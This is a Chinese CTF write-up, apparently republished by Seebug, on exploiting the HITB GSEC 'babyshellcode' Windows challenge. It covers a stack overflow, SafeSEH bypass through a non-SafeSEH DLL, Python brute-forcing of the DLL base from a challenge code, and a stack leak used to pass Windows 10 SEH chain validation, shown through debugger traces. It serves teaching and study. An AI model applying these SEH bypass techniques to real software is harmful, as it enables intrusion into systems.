作者：[k0shl](https://whereisk0shl.top/hitb_gsec_ctf_babyshellcode_writeup.html)

#### 前言

这次在 HITB GSEC CTF 打酱油，也有了一次学习的机会，这次CTF出现了两道 Windows
pwn，我个人感觉质量非常高，因为题目出了本身无脑洞的漏洞之外，更多的让选手们专注于对 Windows
系统的防护机制（seh）原理的研究，再配合漏洞来完成对机制的突破和利用，在我做完之后重新整理整个解题过程，略微有一些窒息的感觉，感觉整个利用链环环相扣，十分精彩，不得不膜一下Atum大佬，题目出的真的好！对于菜鸟来说，是一次非常好的锻炼机会。

因此我认真总结了我们从拿到题目，多种尝试，不断改进 exp，到最后获得 shell 的整个过程，而不仅仅是针对题目，希望能对同样奋斗在 win pwn
的小伙伴有一些帮助。

#### Babyshellcode Writeup with SEH and SafeSEH From Windows xp to Windows 10

拿到题目的时候，我们发现程序存在一个很明显的栈溢出，而且题目给的一些条件非常好，在栈结构中存在 SEH 链，在常规的利用 SEH 链进行栈溢出从而控制
eip 的过程中，我们会使用栈溢出覆盖 seh handler，这是一个 seh chain 中的一个指针，它指向了异常处理函数。

但是程序中开启了 safeseh，也就是说，单纯的通过覆盖 seh handler 跳转是不够的，我们首先需要 bypass safeseh。

OK，我们来看题目。

在题目主函数中，首先在 `scmgr.dll` 中会初始化存放 shellcode 的堆，调用的是 VirtualAlloc 函数，并且会打印堆地址。

    
    
      v0 = VirtualAlloc(0, 20 * SystemInfo.dwPageSize, 0x1000u, 0x40u);//注意这里的flprotect是0x40
    
      dword_1000338C = (int)v0;
    
      if ( v0 )
    
      {
    
        sub_10001020("Global memory alloc at %p\n", (char)v0);//打印堆地址
    
        result = dword_1000338C;
    
        dword_10003388 = dword_1000338C;
    
      }

这里 VirtualAlloc 中有一个参数是 flprotect，值是 0x40，表示拥有 RWE 权限。

    
    
    #define PAGE_EXECUTE_READWRITE 0x40

这个堆地址会用于存放 shellcode，在 CreateShellcode 函数中会将 shellcode 拷贝到 Memory 空间里。

    
    
      v4 = 0;//v4在最开始拷贝的时候值是0
    
      ⋯⋯
    
      v11 = (int)*(&Memory + v4);//将Memory地址指针交给v11
    
      v13 = getchar();
    
      v14 = 0;
    
      if ( v12 )
    
      {
    
        do
    
        {
    
          *(_BYTE *)(v14++ + v15) = v13;//为Memory赋值
    
          v13 = getchar();
    
        }
    
        while ( v14 != v12 );
    
        v4 = v16;
    
      }

执行结束之后可以看到 shellcode 已经被拷贝到目标空间中。

![](https://images.seebug.org/content/images/2017/08/f5c87ee1-fc76-46d9-a62e-8c649e60626a.png-w331s)

随后执行 runshellcode 指令的时候，会调用“虚函数”，这里用引号表示，其实并不是真正的虚函数，只是虚函数的一种常见调用方法（做了 CFG
check，这里有个小插曲），实际上调用的是 VirtualAlloc 出来的堆的地址。

    
    
        v4 = *(void (**)(void))(v1 + 4);
    
        __guard_check_icall_fptr(*(_DWORD *)(v1 + 4));
    
        v4();

可以看到这里有个 CFG check，之前我们一直以为环境是 Win7，在 Win7 里 CFG
没有实装，这个在我之前的一篇[IE11浏览器漏洞的文章](https://whereisk0shl.top/cve_2017_0037_ie11&edge_type_confusion.html
"IE11浏览器漏洞的文章")中也提到过，因此这个 Check是没用的，但是后来得知系统是
Win10（这个后面会提到），这里会检查指针是否合法，这里无论如何都会合法，因为 v1+4 位置的值控制不了，这里就是指向堆地址。

这里跳转到堆地址后会由于 shellcode 头部4字节被修改，导致进入堆地址后是无效的汇编指令。

    
    
      byte_405448 = 1;
    
      puts("Hey, Welcome to shellcode test system!");
    
    
    
        if ( byte_405448 )
    
        {
    
          v3 = *(_DWORD **)(v1 + 4);
    
          memcpy(&Dst, *(const void **)(v1 + 4), *(_DWORD *)(v1 + 8));//这里没有对长度进行控制，造成栈溢出
    
          *v3 = -1;
    
        }

`byte_405448` 是一个全局变量 `is_guard`，它在 runshellcode 里决定了存放 shellcode 堆指针指向的
shellcode 前4字节是否改成0xffffffff，这里 `byte_405448`的值是
1，因此头部会被修改，而我们也必须进入这里，只有这里才能造成栈溢出。

    
    
    0:000> g
    
    Breakpoint 1 hit
    
    eax=002bf7a4 ebx=00000000 ecx=00000000 edx=68bc1100 esi=000e0000 edi=0048e430
    
    eip=00a113f3 esp=002bf794 ebp=002bf824 iopl=0         nv up ei pl nz ac po nc
    
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
    
    babyshellcode+0x13f3:
    
    00a113f3 c706ffffffff    mov     dword ptr [esi],0FFFFFFFFh ds:0023:000e0000=61616161//shellcode头部被修改前正常
    
    0:000> dd e0000 l1
    
    000e0000  61616161 
    
    0:000> p
    
    eax=002bf7a4 ebx=00000000 ecx=00000000 edx=68bc1100 esi=000e0000 edi=0048e430
    
    eip=00a113f9 esp=002bf794 ebp=002bf824 iopl=0         nv up ei pl nz ac po nc
    
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
    
    babyshellcode+0x13f9:
    
    00a113f9 8b7704          mov     esi,dword ptr [edi+4] ds:0023:0048e434=000e0000
    
    0:000> dd e0000 l1//头部被修改成0xffffffff
    
    000e0000  ffffffff

随后我们跳转到头部执行，由于指令异常进入异常处理模块。

    
    
    0:000> p
    
    eax=002bf7a4 ebx=00000000 ecx=000e0000 edx=68bc1100 esi=000e0000 edi=0048e430
    
    eip=00a11404 esp=002bf794 ebp=002bf824 iopl=0         nv up ei pl nz ac po nc
    
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
    
    babyshellcode+0x1404:
    
    00a11404 ffd6            call    esi {000e0000}//跳转到堆
    
    0:000> t
    
    eax=002bf7a4 ebx=00000000 ecx=000e0000 edx=68bc1100 esi=000e0000 edi=0048e430
    
    eip=000e0000 esp=002bf790 ebp=002bf824 iopl=0         nv up ei pl nz ac po nc
    
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
    
    000e0000 ff              ???//异常指令
    
    0:000> p//进入异常处理模块
    
    (20f90.20f9c): Illegal instruction - code c000001d (first chance)
    
    eax=002bf7a4 ebx=00000000 ecx=000e0000 edx=68bc1100 esi=000e0000 edi=0048e430
    
    eip=770b6bc9 esp=002bf340 ebp=002bf824 iopl=0         nv up ei pl nz ac po nc
    
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
    
    ntdll!KiUserExceptionDispatcher+0x1:
    
    770b6bc9 8b4c2404        mov     ecx,dword ptr [esp+4] ss:0023:002bf344=002bf35c

利用 SEH 是栈溢出里常见的一种利用方法，在没有 SafeSEH 和 SEHOP 的情况下，可以利用 seh 里一个特殊的结构 seh
handler，通过覆盖它来完成 eip/rip 的控制，它指向的是异常处理函数，而加入了 safeseh之后，会对 sehhandler 进行
check，检查它是否可信，不可信的话返回0，则不会跳转到 seh handler。而这个 safeseh 的 check 在 ntdll 的
RtlIsValidHandler 函数中，几年前 Alex 就发了关于这个函数的解读，现在伪代码遍地都是了。

    
    
    BOOL RtlIsValidHandler(handler)
    
    
    
    {
    
    if (handler is in an image)//step 1 
    
    {
    
             // 在加载模块的进程空间
    
    if (image has the IMAGE_DLLCHARACTERISTICS_NO_SEH flag set)
    
        return FALSE; // 该标志设置，忽略异常处理，直接返回FALSE
    
    if (image has a SafeSEH table) // 是否含有SEH表
    
        if (handler found in the table)
    
            return TRUE; // 异常处理handle在表中，返回TRUE
    
        else
    
            return FALSE; // 异常处理handle不在表中，返回FALSE
    
    if (image is a .NET assembly with the ILonly flag set)
    
        return FALSE; // .NET 返回FALSE
    
    // fall through
    
    }
    
    if (handler is on a non-executable page)//step 2
    
    {
    
             // handle在不可执行页上面
    
        if (ExecuteDispatchEnable bit set in the process flags)
    
            return TRUE; // DEP关闭，返回TRUE；否则抛出异常
    
        else
    
            raise ACCESS_VIOLATION; // enforce DEP even if we have no hardware NX
    
    }
    
    if (handler is not in an image)//step 3
    
    {
    
             // 在加载模块内存之外，并且是可执行页
    
        if (ImageDispatchEnable bit set in the process flags)
    
            return TRUE; // 允许在加载模块内存空间外执行，返回验证成功
    
        else
    
            return FALSE; // don't allow handlers outside of images
    
    }
    
    // everything else is allowed
    
    return TRUE;
    
    }

首先我们想到的是利用堆指针来 bypass safeseh，正好这个堆地址指向的 shellcode，但是由于头部四字节呗修改成了
0xffffffff，因此我们只需要覆盖 seh handler 为 heap address＋4，然后把 shellcode
跳过开头4字节编码，头4字节放任意字符串（反正会被编码成0xffffffff），然后后面放 shellcode
的内容，应该就可以达到利用了（事实证明我too young too naive了，这个方法在 win xp 下可以用。）

于是我们想到的栈布局如下：

![](https://images.seebug.org/content/images/2017/08/ed9dbeff-31c5-43b2-b526-2bd3d5f461ec.png-w331s)

但我们这样执行后，在 windows xp 下可以完成，但是 win7 下依然 crash 了，这就需要我们跟进
`ntdll!RtlIsValidHandler` 函数，回头看下伪代码部分。

这里有三步 check，首先 step1，if 是不通过的因为堆地址属于加载进程外的地址，同理 step2
也是不通过的，因为堆地址申请的时候是可执行的，之所以用堆绕过 SafeSEH 是因为堆地址属于当前进程加载内存映像空间之外的地址。

    
    
    0:000> !address e0000
    
    Usage:                  <unclassified>
    
    Allocation Base:        000e0000
    
    Base Address:           000e0000
    
    End Address:            000f4000
    
    Region Size:            00014000
    
    Type:                   00020000    MEM_PRIVATE
    
    State:                  00001000    MEM_COMMIT
    
    Protect:                00000040    PAGE_EXECUTE_READWRITE

那么 safeseh 进入 step 3，又是加载模块内存之外的，又是可执行的，在 winxp，通过堆绕过是可行的，但是在 Win7
及以上版本就不行了，为什么呢，因为这里多了一个 Check，内容是
`MEM_EXECUTE_OPTION_IMAGE_DISPATCH_ENABLE`，它决定了是否允许在加载模块内存空间外执行。

![](https://images.seebug.org/content/images/2017/08/ccbcfcfe-7e48-4279-aada-578a32dda860.jpg-w331s)

这里只有当第六个比特为1时，才是可执行的

这里值是 0x4d，也就是 1001101，第六个比特是 0，也就是 `MEM_EXECUTE_OPTION_IMAGE_DISPATCH_ENABLE`
是不允许的，因此会 return FALSE。

    
    
    0:000> p
    
    eax=00000000 ebx=000e0000 ecx=002bf254 edx=770b6c74 esi=002bf348 edi=00000000
    
    eip=77100224 esp=002bf274 ebp=002bf2b0 iopl=0         nv up ei ng nz na pe cy
    
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000287
    
    ntdll!RtlIsValidHandler+0xff:
    
    77100224 8a450c          mov     al,byte ptr [ebp+0Ch]      ss:0023:002bf2bc=4d
    
    0:000> p
    
    eax=00000000 ebx=002bf814 ecx=736f4037 edx=770b6c74 esi=002bf348 edi=00000000
    
    eip=7708f88d esp=002bf2b4 ebp=002bf330 iopl=0         nv up ei pl zr na pe nc
    
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    
    ntdll!RtlIsValidHandler+0xfc:
    
    7708f88d c20800          ret     8
    
    0:000> p
    
    eax=00000000 ebx=002bf814 ecx=736f4037 edx=770b6c74 esi=002bf348 edi=00000000
    
    eip=7708f9fe esp=002bf2c0 ebp=002bf330 iopl=0         nv up ei pl zr na pe nc
    
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    
    ntdll!RtlDispatchException+0x10e:
    
    7708f9fe 84c0            test    al,al
    
    0:000> r al
    
    al=0

通过堆绕过的方法失败了，我们又找到了其他方法，就是通过未开启 safeseh 的 dll 的方法来绕过 safeseh，这里我们找到了
scmgr.dll，它是一个未开启 safeseh 的模块，这个可以直接通过 od 的 OllySSEH 功能看到 SafeSEH 的开启状态。

![](https://images.seebug.org/content/images/2017/08/8d8a6449-dc7b-4eec-b0be-b7d7f19e314e.jpg-w331s)

这里我们只需要把 seh handler 指向 scmgr.dll 就可以了，而且我们在 scmgr.dll 里发现，其实
system('cmd')已经在里面了，只需要跳转过去就可以了。

    
    
    .text:10001100                 public getshell_test
    
    .text:10001100 getshell_test   proc near               ; DATA XREF: .rdata:off_10002518o
    
    .text:10001100                 push    offset Command  ; "cmd"
    
    .text:10001105                 call    ds:system
    
    .text:1000110B ; 3:   return 0;
    
    .text:1000110B                 add     esp, 4
    
    .text:1000110E                 xor     eax, eax
    
    .text:10001110                 retn
    
    .text:10001110 getshell_test   endp

但是这里有一个问题，就是 scmgr.dll 的基址是多少，这里我们想了两种方法来获得基址，一个是爆破，因为我们发现 scmgr.dll
在每次进程重启的时候基址都不变，因此我们只需要在 0x60000000-0x8000000 之间爆破就可以，0x8000000
之上是内核空间的地址了，因此只需要爆破这个范围即可。（由于刚开始以为是 win7，所以爆破的时候有一点没有考虑到，导致目标总是
crash，我们也找不到原因，本地测试是完全没问题的，后面会提到）。

还有一种方法是我们看到了 set shellcodeguard 函数，这个就是我们之前提到对 is_guard
那个全局变量设置的函数，但实际上，这个也没法把这个值置 0，毕竟置 0之后直接就能撸 shellcode 了，但我们关注到 Disable
Shellcode Guard 中一个有趣的加密。

    
    
      puts("1. Disable ShellcodeGuard");
    
      puts("2. Enable ShellcodeGuard");
    
      ⋯⋯
    
      if ( v2 == 1 )//加密在这里
    
      {
    
        v3 = ((int (*)(void))sub_4017F0)();
    
        v4 = sub_4017F0(v3);
    
        v5 = sub_4017F0(v4);
    
        v6 = sub_4017F0(v5);
    
        v7 = sub_4017F0(v6);
    
        v8 = sub_4017F0(v7);
    
        sub_4017C0("Your challenge code is %x-%x-%x-%x-%x-%x\n", v8);
    
        puts("challenge response:");
    
        v9 = 0;
    
        v10 = getchar();
    
        do
    
        {
    
          if ( v10 == 10 )
    
            break;
    
          ++v9;
    
          v10 = getchar();
    
        }
    
        while ( v9 != 20 );
    
        puts("respose wrong!");
    
      }
    
      else//当v2为0的时候是Enable Shellcode Guard，全局变量置1
    
      {
    
        if ( v2 == 2 )
    
        {
    
          byte_405448 = 1;
    
          return 0;
    
        }
    
        puts("wrong option");
    
      }

这个加密其实很复杂的。

![](https://images.seebug.org/content/images/2017/08/ae0cab27-3b11-41d8-8a87-4be84a01d541.png-w331s)

后来官方也给出了hint，Hint for babyshellcode: The algorithm is neither irreversible nor
z3-solvable.告诉大家这个加密算法不可逆，别想了！

先我们来看一下这个加密算法加密的什么玩意，我们跟入这个算法。

    
    
    0:000> p
    
    eax=ae7e77d0 ebx=0000001f ecx=0cd4ae6b edx=00000000 esi=00ae7e77 edi=354eaad0
    
    eip=00a11818 esp=0016fcd8 ebp=0016fd08 iopl=0         ov up ei pl nz na pe cy
    
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000a07
    
    babyshellcode+0x1818:
    
    *** WARNING: Unable to verify checksum for C:\Users\sh1\Desktop\scmgr.dll
    
    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Users\sh1\Desktop\scmgr.dll - 
    
    00a11818 3334955054a100  xor     esi,dword ptr babyshellcode+0x5450 (00a15450)[edx*4] ds:0023:00a15450={scmgr!init_scmgr (67bc1090)}

发现在算法初始化的时候，加密的是 `scmgr!init_scmgr` 的地址，也就是 `67bc1090`，这个就厉害了，既然不可逆，我们把这个算法
dump 出来正向爆破去算，如果结果等于最后加密的结果，那就是碰到基址了，这样一是不用频繁和服务器交互，二是及时 dll
每次进程重启基址都改变，也能直接通过这种方法不令进程崩溃也能获得到基址。

    
    
    def gen_cha_code(base):
    
        init_scmgr = base*0x10000 +0x1090
    
    
    
        value = init_scmgr
    
        g_table = [value]
    
        for i in range(31):
    
            value = (value * 69069)&0xffffffff
    
            g_table.append(value)
    
    
    
        g_index = 0
    
    
    
        v0 = (g_index-1)&0x1f
    
        v2 = g_table[(g_index+3)&0x1f]^g_table[g_index]^(g_table[(g_index+3)&0x1f]>>8)
    
        v1 = g_table[v0]
    
        v3 = g_table[(g_index + 10) & 0x1F]
    
        v4 = g_table[(g_index - 8) & 0x1F] ^ v3 ^ ((v3 ^ (32 * g_table[(g_index - 8) & 0x1F])) << 14)
    
        v4 = v4&0xffffffff
    
        g_table[g_index] = v2^v4
    
        g_table[v0] = (v1 ^ v2 ^ v4 ^ ((v2 ^ (16 * (v1 ^ 4 * v4))) << 7))&0xffffffff
    
        g_index = (g_index - 1) & 0x1F
    
        return g_table[g_index]

这样，获取到基址之后，我们就能够构造 seh handler 了，直接令 seh handler 指向 getshell_test
就直接能获得和目标的shell交互了。通过栈溢出覆盖 seh chain。

    
    
    0:000> !exchain
    
    0016fcf8: scmgr!getshell_test+0 (67bc1100)
    
    Invalid exception stack at 0d16fd74

进入 safeseh，由于在 nosafeseh 空间，返回 true，该地址可信。

    
    
    0:000> p
    
    eax=72b61100 ebx=0023f99c ecx=0023f424 edx=770b6c74 esi=0023f4c8 edi=00000000
    
    eip=7708f9f9 esp=0023f438 ebp=0023f4b0 iopl=0         nv up ei pl nz na pe nc
    
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    
    ntdll!RtlDispatchException+0x109:
    
    7708f9f9 e815feffff      call    ntdll!RtlIsValidHandler (7708f813)
    
    0:000> p
    
    eax=0023f401 ebx=0023f99c ecx=73a791c6 edx=00000000 esi=0023f4c8 edi=00000000
    
    eip=7708f9fe esp=0023f440 ebp=0023f4b0 iopl=0         nv up ei pl zr na pe nc
    
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    
    ntdll!RtlDispatchException+0x10e:
    
    7708f9fe 84c0            test    al,al
    
    0:000> r al
    
    al=1

进入 call seh handler，跳转到 `getshell_test`。

    
    
    0:000> p
    
    eax=00000000 ebx=00000000 ecx=73a791c6 edx=770b6d8d esi=00000000 edi=00000000
    
    eip=770b6d74 esp=0023f3e4 ebp=0023f400 iopl=0         nv up ei pl zr na pe nc
    
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    
    ntdll!ExecuteHandler2+0x21:
    
    770b6d74 8b4d18          mov     ecx,dword ptr [ebp+18h] ss:0023:0023f418={scmgr!getshell_test (72b61100)}
    
    0:000> p
    
    eax=00000000 ebx=00000000 ecx=72b61100 edx=770b6d8d esi=00000000 edi=00000000
    
    eip=770b6d77 esp=0023f3e4 ebp=0023f400 iopl=0         nv up ei pl zr na pe nc
    
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    
    ntdll!ExecuteHandler2+0x24:
    
    770b6d77 ffd1            call    ecx {scmgr!getshell_test (72b61100)}
    
    0:000> t
    
    eax=00000000 ebx=00000000 ecx=72b61100 edx=770b6d8d esi=00000000 edi=00000000
    
    eip=72b61100 esp=0023f3e0 ebp=0023f400 iopl=0         nv up ei pl zr na pe nc
    
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    
    scmgr!getshell_test:
    
    72b61100 68f420b672      push    offset scmgr!getshell_test+0xff4 (72b620f4)

![](https://images.seebug.org/content/images/2017/08/5d55285b-2d0b-4ca7-b701-c5775ed552a6.png-w331s)

到这里利用就完整了吗？我们在 win7 下没问题了，但是在目标却一直 crash 掉，实在是搞不明白，后来才知道，我们用错了环境！原来目标是Win10...

Win10 的 SafeSEH 和 Win7 又有所区别，这里要提到SEH的两个域，一个是 prev 域和 handler
域，prev域会存放一个指向下一个 seh chain 的栈地址，handler 域就是存放的 seh handler，而 Win10 里面多了一个
Check 函数 `ntdll!RtlpIsValidExceptionChain`，这个函数会去获得当前 seh chain 的 prev 域的值。

    
    
    0:000> p//这里我们覆盖prev为0x61616161
    
    eax=030fd000 ebx=03100000 ecx=030ff7ac edx=6fdd1100 esi=030ff278 edi=030fd000
    
    eip=7771ea79 esp=030ff1bc ebp=030ff1c8 iopl=0         nv up ei pl nz na pe nc
    
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
    
    ntdll!RtlpIsValidExceptionChain+0x2b:
    
    7771ea79 8b31            mov     esi,dword ptr [ecx]  ds:002b:030ff7ac=61616161
    
    0:000> p
    
    eax=030fd000 ebx=03100000 ecx=030ff7ac edx=6fdd1100 esi=61616161 edi=030fd000
    
    eip=7771ea7b esp=030ff1bc ebp=030ff1c8 iopl=0         nv up ei pl nz na pe nc
    
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
    
    ntdll!RtlpIsValidExceptionChain+0x2d:
    
    7771ea7b 83feff          cmp     esi,0FFFFFFFFh
    
    0:000> p
    
    eax=030fd000 ebx=03100000 ecx=030ff7ac edx=6fdd1100 esi=61616161 edi=030fd000
    
    eip=7771ea7e esp=030ff1bc ebp=030ff1c8 iopl=0         nv up ei pl nz ac po cy
    
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000213
    
    ntdll!RtlpIsValidExceptionChain+0x30:
    
    7771ea7e 740f            je      ntdll!RtlpIsValidExceptionChain+0x41 (7771ea8f) [br=0]

随后，会去和 seh 表里存放的 prev 域的值进行比较。

    
    
    0:000> p
    
    eax=030ff7b4 ebx=03100000 ecx=61616161 edx=6fdd1100 esi=61616161 edi=030fd000
    
    eip=7771ea8a esp=030ff1bc ebp=030ff1c8 iopl=0         nv up ei pl nz ac po cy
    
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000213
    
    ntdll!RtlpIsValidExceptionChain+0x3c:
    
    7771ea8a 8d53f8          lea     edx,[ebx-8]
    
    0:000> p
    
    eax=030ff7b4 ebx=03100000 ecx=61616161 edx=030ffff8 esi=61616161 edi=030fd000
    
    eip=7771ea8d esp=030ff1bc ebp=030ff1c8 iopl=0         nv up ei pl nz ac po cy
    
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000213
    
    ntdll!RtlpIsValidExceptionChain+0x3f:
    
    7771ea8d ebd6            jmp     ntdll!RtlpIsValidExceptionChain+0x17 (7771ea65)
    
    0:000> p
    
    eax=030ff7b4 ebx=03100000 ecx=61616161 edx=030ffff8 esi=61616161 edi=030fd000
    
    eip=7771ea65 esp=030ff1bc ebp=030ff1c8 iopl=0         nv up ei pl nz ac po cy
    
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000213
    
    ntdll!RtlpIsValidExceptionChain+0x17:
    
    7771ea65 3bc1            cmp     eax,ecx//ecx寄存器存放的是栈里被覆盖的，eax存放的是正常的pointer to next chain

可以看到这里检测是不通过的，因此造成了 crash，所以，我们需要对 seh chain 进行 fix，把 pointer to next chain
修改成下一个 seh chain 的栈地址，这就需要我们获取当前的栈地址，栈地址是自动动态申请和回收的，和堆不一样，因此每次栈地址都会发生变化，我们需要一个
stack info leak。

于是我们在程序中找到了这样一个 stack info leak 的漏洞，开头有个 stack info leak，在最开始的位置。

    
    
      v1 = getchar();
    
      do
    
      {
    
        if ( v1 == 10 )
    
          break;
    
        *((_BYTE *)&v5 + v0++) = v1;
    
        v1 = getchar();
    
      }
    
      while ( v0 != 300 );
    
      sub_4017C0("hello %s\n", &v5);
    
    
    
    
    
    0:000> g//一字节一字节写入，esi是计数器，ebp-18h是指向拷贝目标的指针
    
    Breakpoint 0 hit
    
    eax=00000061 ebx=7ffde000 ecx=574552e0 edx=00000061 esi=00000000 edi=005488a8
    
    eip=000a16a4 esp=0036f90c ebp=0036f938 iopl=0         nv up ei pl nz ac po nc
    
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
    
    babyshellcode+0x16a4:
    
    000a16a4 884435e8        mov     byte ptr [ebp+esi-18h],al  ss:0023:0036f920=00
    
    0:000> p
    
    eax=00000061 ebx=7ffde000 ecx=574552e0 edx=00000061 esi=00000000 edi=005488a8
    
    eip=000a16a8 esp=0036f90c ebp=0036f938 iopl=0         nv up ei pl nz ac po nc
    
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
    
    babyshellcode+0x16a8:
    
    000a16a8 46              inc     esi
    
    0:000> p//获取下一字节
    
    eax=00000061 ebx=7ffde000 ecx=574552e0 edx=00000061 esi=00000001 edi=005488a8
    
    eip=000a16a9 esp=0036f90c ebp=0036f938 iopl=0         nv up ei pl nz na po nc
    
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    
    babyshellcode+0x16a9:
    
    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Users\sh1\Desktop\ucrtbase.DLL - 
    
    000a16a9 ff15e4300a00    call    dword ptr [babyshellcode+0x30e4 (000a30e4)] ds:0023:000a30e4={ucrtbase!getchar (5740b260)}
    
    0:000> p//判断长度
    
    eax=00000061 ebx=7ffde000 ecx=574552e0 edx=574552e0 esi=00000001 edi=005488a8
    
    eip=000a16af esp=0036f90c ebp=0036f938 iopl=0         nv up ei pl zr na pe nc
    
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    
    babyshellcode+0x16af:
    
    000a16af 81fe2c010000    cmp     esi,12Ch
    
    0:000> p
    
    eax=00000061 ebx=7ffde000 ecx=574552e0 edx=574552e0 esi=00000001 edi=005488a8
    
    eip=000a16b5 esp=0036f90c ebp=0036f938 iopl=0         nv up ei ng nz ac po cy
    
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293
    
    babyshellcode+0x16b5:
    
    000a16b5 75e9            jne     babyshellcode+0x16a0 (000a16a0)         [br=1]
    
    0:000> p//判断是否是回车
    
    eax=00000061 ebx=7ffde000 ecx=574552e0 edx=574552e0 esi=00000001 edi=005488a8
    
    eip=000a16a0 esp=0036f90c ebp=0036f938 iopl=0         nv up ei ng nz ac po cy
    
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293
    
    babyshellcode+0x16a0:
    
    000a16a0 3c0a            cmp     al,0Ah
    
    0:000> p
    
    eax=00000061 ebx=7ffde000 ecx=574552e0 edx=574552e0 esi=00000001 edi=005488a8
    
    eip=000a16a2 esp=0036f90c ebp=0036f938 iopl=0         nv up ei pl nz ac po nc
    
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
    
    babyshellcode+0x16a2:
    
    000a16a2 7413            je      babyshellcode+0x16b7 (000a16b7)         [br=0]
    
    0:000> p//继续写入
    
    Breakpoint 0 hit
    
    eax=00000061 ebx=7ffde000 ecx=574552e0 edx=574552e0 esi=00000001 edi=005488a8
    
    eip=000a16a4 esp=0036f90c ebp=0036f938 iopl=0         nv up ei pl nz ac po nc
    
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
    
    babyshellcode+0x16a4:
    
    000a16a4 884435e8        mov     byte ptr [ebp+esi-18h],al  ss:0023:0036f921=00

这里判断的长度是 0x12C，也就是 300，但实际上拷贝目标 ebp-18 很短，而 esi 会不断增加，而没有做控制，最关键的是这个过程。

    
    
    .text:004016A4 ; 20:     *((_BYTE *)&v5 + v0++) = v1;
    
    .text:004016A4                 mov     byte ptr [ebp+esi+var_18], al
    
    .text:004016A8 ; 21:     v1 = getchar();
    
    .text:004016A8                 inc     esi//key！！
    
    .text:004016A9                 call    ds:getchar
    
    .text:004016AF ; 23:   while ( v0 != 300 );
    
    .text:004016AF                 cmp     esi, 12Ch

这里是在赋值结束之后，才将 esi
自加1，然后才去做长度判断，然后再跳转去做是否回车的判断，如果回车则退出，也就是说，这里会多造成4字节的内存泄漏，我们来看一下赋值过程中的内存情况。

    
    
    0:000> dd ebp-18 l7
    
    0036f920  00000061 00000000 00000000 00000000
    
    0036f930  00000000 1ea6b8ab 0036f980

可以看到，在 0036f920 地址便宜 +0x18 的位置存放着一个栈地址，也就是说，如果我们让 name 的长度覆盖到 0036f938
位置的时候，多泄露的4字节是一个栈地址，这样我们就可以用来 fix seh stack 了。

![](https://images.seebug.org/content/images/2017/08/aa2005f1-82b6-4166-96f1-1b9b8ff7b181.png-w331s)

有了这个内存泄漏，我们就可以重新构造栈布局了，栈布局如下：

![](https://images.seebug.org/content/images/2017/08/8558714c-8eaf-4b28-a2d1-6ff246014ede.png-w331s)

这样，结合之前我们的整个利用过程，完成整个利用链，最后完成shell交互。

![](https://images.seebug.org/content/images/2017/08/331f748c-7f9a-42d0-8926-069b119905b4.jpg-w331s)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/378/>

